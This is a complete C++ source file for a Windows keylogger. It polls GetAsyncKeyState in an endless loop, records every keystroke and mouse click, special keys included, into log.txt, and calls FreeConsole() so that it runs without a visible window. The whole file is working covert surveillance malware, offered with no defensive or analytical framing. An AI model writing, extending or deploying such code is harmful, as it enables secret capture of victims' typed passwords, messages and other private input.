#include<iostream>
#include<windows.h>
#include<WinUser.h>
#include<fstream>

using namespace std;

void logging()
{
    char c;
    while(1)
    {
        Sleep(10);
        for(c=8;c<=255;c++)
        {
            if(GetAsyncKeyState(c) & 0x1 ) // or equals to -32767
            {
                ofstream log;
                log.open("log.txt",ios::app);
                switch(c) { 
                case VK_SHIFT: log<<"[SHIFT]"; 
                    break;
                case VK_CONTROL: log<<"[CTRL]"; 
                    break;
                case VK_MENU: log<<"[ALT]";
                    break;
                case VK_LWIN: log<<"[LWIN]"; 
                    break;
                case VK_RWIN: log<<"[RWIN]"; 
                    break;
                case VK_CAPITAL: log<<"[CAPS]";
                    break;
                case VK_LEFT: log<<"[LEFT ARROW]"; 
                    break;
                case VK_RIGHT: log<<"[RIGHT ARROW]"; 
                    break;
                case VK_UP: log<<"[UP ARROW]"; 
                    break;
                case VK_DOWN: log<<"[DOWN ARROW]"; 
                    break;

                case VK_BACK: log<<"[BACKSPACE]"; 
                    break;
                    case VK_TAB: log<<"[TAB]";
                    break;
                case VK_RETURN: log<<"[ENTER]"; 
                    break;
                case VK_ESCAPE: log<<"[ESCAPE]"; 
                    break;
                case VK_SPACE: log<<"[SPACE]";
                    break;
                case VK_DELETE: log<<"[DELETE]"; 
                    break;
                case VK_INSERT: log<<"[INSERT]"; 
                    break;
                case VK_LBUTTON: log<<"[LEFT CLICK]";
                    break;
                case VK_RBUTTON: log<<"[RIGHT CLICK]"; 
                    break;
                case VK_MBUTTON: log<<"[MIDDLE MOUSE BUTTON]"; 
                    break;
                case VK_HOME:   log<<"[HOME]"; 
                    break;
                case VK_END: log<<"[END]"; 
                    break;
                case VK_PRIOR: log<<"[PAGE UP]";
                    break;
                case VK_NEXT: log<<"[PAGE DOWN]"; 
                    break;
                    case VK_OEM_1: log<<";";
                    break;
                case VK_OEM_PLUS: log<<"="; 
                    break;
                case VK_OEM_COMMA: log<<","; 
                    break;
                case VK_OEM_MINUS: log<<"-"; 
                    break;
                case VK_OEM_PERIOD: log<<"."; 
                    break;
                case VK_OEM_2: log<<"/";
                    break;
                case VK_OEM_3: log<<"`"; 
                    break;
                case VK_OEM_4: log<<"["; 
                    break;
                case VK_OEM_5: log<<"\\"; 
                    break;
                case VK_OEM_6: log<<"]";
                    break;
                case VK_OEM_7: log<<"'"; 
                    break;
                case VK_F1: log<<"[F1]"; 
                        break;
                case VK_F2: log<<"[F2]";
                        break;
                case VK_F3: log<<"[F3]";
                        break;
                case VK_F4: log<<"[F4]";
                        break;
                case VK_F5: log<<"[F5]";
                        break;
                case VK_F6: log<<"[F6]";
                        break;
                case VK_F7: log<<"[F7]";
                        break;
                case VK_F8: log<<"[F8]";
                        break;
                case VK_F9: log<<"[F9]";
                        break;
                case VK_F10: log<<"[F10]";
                        break;
                case VK_F11: log<<"[F11]";
                        break;
                case VK_F12: log<<"[F12]";
                        break;
                default: log<<c;
            }
            log.close();
            }
        }
    }
}

int main()
{
    FreeConsole();
    logging();
    return 0;
}